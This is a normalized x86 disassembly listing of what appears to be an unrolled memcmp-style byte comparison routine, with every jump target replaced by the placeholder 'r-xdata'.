movzx edx [ ecx - 0xf ]
movzx esi [ eax - 0xf ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
je r-xdata
mov esi [ eax + 0x8 ]
cmp esi [ ecx + 0x8 ]
je r-xdata
movzx esi [ eax + 0x5 ]
movzx ebx [ ecx + 0x5 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0x3 ]
movzx ebx [ ecx + 0x3 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax - 0x1b ]
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x17 ]
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x13 ]
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xf ]
movzx edx [ ecx - 0xf ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xb ]
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x7 ]
movzx edx [ ecx - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
jne r-xdata
movzx esi [ eax - 0x1c ]
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x18 ]
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x14 ]
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x10 ]
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xc ]
movzx edx [ ecx - 0xc ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x8 ]
movzx edx [ ecx - 0x8 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x4 ]
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x1d ]
movzx edx [ ecx - 0x1d ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x19 ]
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x15 ]
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x11 ]
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xd ]
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx edx [ ecx - 0x9 ]
movzx esi [ eax - 0x9 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x5 ]
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
jne r-xdata
movzx esi [ eax - 0x1e ]
movzx edx [ ecx - 0x1e ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x1a ]
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x16 ]
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x12 ]
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xe ]
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xa ]
movzx edx [ ecx - 0xa ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x6 ]
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
mov eax edx
jmp r-xdata
xor esi esi
movzx esi [ eax + 0x8 ]
movzx ebx [ ecx + 0x8 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x6 ]
movzx ebx [ ecx + 0x6 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
movzx esi [ eax - 0x1a ]
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x16 ]
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x12 ]
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xe ]
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xa ]
movzx edx [ ecx - 0xa ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x6 ]
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x2 ]
movzx edx [ ecx - 0x2 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
jne r-xdata
mov eax edx
jmp r-xdata
movzx esi [ eax - 0x1b ]
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x17 ]
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x13 ]
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xf ]
movzx edx [ ecx - 0xf ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xb ]
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x7 ]
movzx edx [ ecx - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x1c ]
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x18 ]
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x14 ]
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x10 ]
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xc ]
movzx edx [ ecx - 0xc ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx edx [ ecx - 0x8 ]
movzx esi [ eax - 0x8 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x4 ]
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
jmp r-xdata
movzx esi [ eax - 0x1d ]
movzx edx [ ecx - 0x1d ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x19 ]
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x15 ]
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x11 ]
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xd ]
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x9 ]
movzx edx [ ecx - 0x9 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x5 ]
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
mov esi [ eax + 0xc ]
cmp esi [ ecx + 0xc ]
je r-xdata
movzx esi [ eax + 0x9 ]
movzx ebx [ ecx + 0x9 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0x7 ]
movzx ebx [ ecx + 0x7 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax - 0x19 ]
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x15 ]
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x11 ]
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xd ]
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x9 ]
movzx edx [ ecx - 0x9 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x5 ]
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx eax [ eax - 0x1 ]
movzx ecx [ ecx - 0x1 ]
sub eax ecx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
je r-xdata
test eax eax
jne r-xdata
movzx esi [ eax - 0x1a ]
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x16 ]
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x12 ]
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xe ]
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xa ]
movzx edx [ ecx - 0xa ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x6 ]
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x2 ]
movzx edx [ ecx - 0x2 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x1b ]
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x17 ]
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x13 ]
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xf ]
movzx edx [ ecx - 0xf ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xb ]
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx edx [ ecx - 0x7 ]
movzx esi [ eax - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x1c ]
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x18 ]
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x14 ]
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x10 ]
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xc ]
movzx edx [ ecx - 0xc ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x8 ]
movzx edx [ ecx - 0x8 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x4 ]
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0xc ]
movzx ebx [ ecx + 0xc ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0xa ]
movzx ebx [ ecx + 0xa ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
xor ecx ecx
test eax eax
setg cl
lea ecx [ ecx + ecx - 0x1 ]
mov eax ecx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
mov esi [ eax + 0x10 ]
cmp esi [ ecx + 0x10 ]
je r-xdata
movzx esi [ eax + 0xd ]
movzx ebx [ ecx + 0xd ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0xb ]
movzx ebx [ ecx + 0xb ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
xor esi esi
movzx ebx [ ecx + 0x10 ]
movzx esi [ eax + 0x10 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0xe ]
movzx ebx [ ecx + 0xe ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
mov esi [ eax + 0x14 ]
cmp esi [ ecx + 0x14 ]
je r-xdata
movzx esi [ eax + 0x11 ]
movzx ebx [ ecx + 0x11 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0xf ]
movzx ebx [ ecx + 0xf ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0x14 ]
movzx ebx [ ecx + 0x14 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x12 ]
movzx ebx [ ecx + 0x12 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
mov esi [ eax + 0x18 ]
cmp esi [ ecx + 0x18 ]
je r-xdata
movzx esi [ eax + 0x15 ]
movzx ebx [ ecx + 0x15 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0x13 ]
movzx ebx [ ecx + 0x13 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0x18 ]
movzx ebx [ ecx + 0x18 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x16 ]
movzx ebx [ ecx + 0x16 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
mov esi [ eax + 0x1c ]
cmp esi [ ecx + 0x1c ]
je r-xdata
movzx esi [ eax + 0x19 ]
movzx ebx [ ecx + 0x19 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0x17 ]
movzx ebx [ ecx + 0x17 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0x1c ]
movzx ebx [ ecx + 0x1c ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x1a ]
movzx ebx [ ecx + 0x1a ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
add eax edx
add ecx edx
sub edi edx
movzx esi [ eax + 0x1d ]
movzx ebx [ ecx + 0x1d ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0x1b ]
movzx ebx [ ecx + 0x1b ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0x1e ]
movzx ebx [ ecx + 0x1e ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
